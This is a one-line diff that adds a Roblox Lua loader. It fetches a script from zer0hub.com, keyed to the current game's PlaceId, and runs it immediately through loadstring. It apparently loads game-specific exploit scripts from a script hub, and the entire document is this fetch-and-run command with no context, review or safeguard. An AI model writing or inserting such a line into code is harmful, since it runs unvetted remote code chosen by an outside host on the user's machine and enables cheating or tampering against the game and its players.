@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://zer0hub.com/script?code="..game.PlaceId))()
